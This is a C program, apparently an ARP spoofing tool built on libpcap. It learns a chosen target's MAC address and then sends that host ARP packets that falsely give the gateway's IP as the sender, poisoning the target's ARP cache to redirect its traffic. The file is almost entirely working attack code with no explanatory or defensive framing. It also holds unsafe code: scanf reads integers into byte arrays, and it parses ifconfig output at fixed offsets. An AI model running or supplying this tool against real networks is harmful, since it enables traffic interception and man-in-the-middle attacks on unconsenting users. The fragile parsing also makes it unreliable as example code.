#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <netinet/if_ether.h>
#include <pcap.h>

#define PACKET_LEN sizeof(struct ether_header) + sizeof(struct ether_arp)
#define PROTO_ARP 0x0806
#define ETH_HEADER_LEN 14
#define HW_TYPE 0x0001
#define PROTOCOL_TYPE 0x0800
#define MAC_LENGTH 0x06
#define IPV4_LENGTH 0x04
#define ARP_REQUEST 0x0001
#define ARP_REPLY 0x0002
#define BUF_SIZE 60

#define DST_ADDR 0
#define SRC_ADDR 6
#define TYPE 12
#define ARP_HW_TYPE 14
#define ARP_PROTOCOL_TYPE 16
#define ARP_HW_LEN 18
#define ARP_PROTOCOL_LEN 19
#define ARP_OPCODE 20
#define ARP_SOURCE_MAC 22
#define ARP_SOURCE_IP 28
#define ARP_TARGET_MAC 32
#define ARP_TARGET_IP 38

struct arp_header
{
    unsigned short hardware_type;
    unsigned short protocol_type;
    unsigned short hardware_len;
    unsigned short protocol_len;
    unsigned short opcode;
    unsigned char sender_mac[MAC_LENGTH];
    unsigned char sender_ip[IPV4_LENGTH];
    unsigned char target_mac[MAC_LENGTH];
    unsigned char target_ip[IPV4_LENGTH];
};

int main()
{
    FILE *ifp;
    char cmd[1024];
    char buff[500];
    const unsigned char *pkt_data;
    unsigned char source_ip[4];
    unsigned char target_ip[4];
    unsigned char gate_ip[4];
    unsigned char target_mac[6];
    unsigned char source_mac[6];

    char errbuf[PCAP_ERRBUF_SIZE];

    struct ethhdr eth;
    struct arp_header arp;

    unsigned char packet[100];
    char gate[100],source[100];
    char target[50];

    char *device;
    int i;
    pcap_t *pcd;
    pcap_pkthdr *header;

    printf("Input Target Address : ");
    scanf("%s",target);
    sscanf(target,"%d.%d.%d.%d", &target_ip[0], &target_ip[1], &target_ip[2], &target_ip[3]);

    sprintf(cmd,"/sbin/ifconfig | grep \'HWaddr\'");  //get hardware mac address
    ifp=popen(cmd,"r");

    if(NULL==ifp)
    {
        perror("popen()...failed.\n");
        return 1;
    }

    fread((void *)buff, 1, 500, ifp);
    sscanf(buff+37,"%s",source);
    sscanf(source,"%02x:%02x:%02x:%02x:%02x:%02x",&source_mac[0],&source_mac[1],&source_mac[2],&source_mac[3],&source_mac[4],&source_mac[5]);

    sprintf(cmd,"/sbin/ifconfig | grep \'inet addr\'");
    ifp=popen(cmd,"r");
    fread((void *)buff, 1, 500, ifp);
    sscanf(buff+20,"%s",source);
    sscanf(source,"%d.%d.%d.%d",&source_ip[0],&source_ip[1],&source_ip[2],&source_ip[3]);

    sprintf(cmd,"/sbin/ip route"); // get gateway ip
    ifp=popen(cmd,"r");
    fread((void *)buff, 1, 500, ifp);
    sscanf(buff+12,"%s",gate);
    sscanf(gate,"%d.%d.%d.%d",&gate_ip[0],&gate_ip[1],&gate_ip[2],&gate_ip[3]);

    device=pcap_lookupdev(errbuf);
    pcd = pcap_open_live(device, BUFSIZ, 0, -1, errbuf);

    for(i=0;i<6;++i)
    {
        eth.h_dest[i]=0xff; //broadcast
        eth.h_source[i]=source_mac[i];
        arp.sender_mac[i]=source_mac[i];
        arp.target_mac[i]=0x00;
    }

    for(i=0;i<4;++i)
    {
        arp.sender_ip[i]=source_ip[i];
        arp.target_ip[i]=target_ip[i];
    }

    eth.h_proto=ntohs(PROTO_ARP);

    arp.hardware_type=ntohs(HW_TYPE);
    arp.protocol_type=ntohs(PROTOCOL_TYPE);
    arp.hardware_len=MAC_LENGTH;
    arp.protocol_len=IPV4_LENGTH;
    arp.opcode=ntohs(ARP_REQUEST);


    for(i=0;i<6;++i)
    {
        packet[DST_ADDR+i]=eth.h_dest[i];
        packet[SRC_ADDR+i]=eth.h_source[i];
        packet[ARP_SOURCE_MAC+i]=arp.sender_mac[i];
        packet[ARP_TARGET_MAC+i]=arp.target_mac[i];
    }

    for(i=0;i<4;++i)
    {
        packet[ARP_SOURCE_IP+i]=arp.sender_ip[i];
        packet[ARP_TARGET_IP+i]=arp.target_ip[i];
    }

    memcpy(packet+TYPE,&eth.h_proto,2);
    memcpy(packet+ARP_HW_TYPE,&arp.hardware_type,2);
    memcpy(packet+ARP_PROTOCOL_TYPE,&arp.protocol_type,2);
    packet[ARP_HW_LEN]=arp.hardware_len;
    packet[ARP_PROTOCOL_LEN]=arp.protocol_len;
    memcpy(packet+ARP_OPCODE,&arp.opcode,2);

    for(i=0;i<42;++i)
        printf("%02x ",packet[i]);

    printf("\n");

    pcap_sendpacket(pcd,packet,PACKET_LEN);


    int res;
    while((res=pcap_next_ex(pcd,&header, &pkt_data)) >= 0 )
    {
        if(res == 0)
            continue;

    if(memcmp((void *)(pkt_data + ARP_TARGET_IP), (void *)source_ip, 4)==0)
       {
            memcpy(target_mac,pkt_data + SRC_ADDR,6);

            for(i=0;i<4;++i)
            {
                packet[ARP_SOURCE_IP+i]=gate_ip[i]; // change source ip
            }

            for(i=0;i<6;++i)
            {
                packet[DST_ADDR+i]=target_mac[i]; // change dst mac address
            }

            for(i=0;i<42;++i)
                printf("%02x ",packet[i]);

            printf("\n");

            pcap_sendpacket(pcd,packet,PACKET_LEN);
        }
    }

    return 0;
}
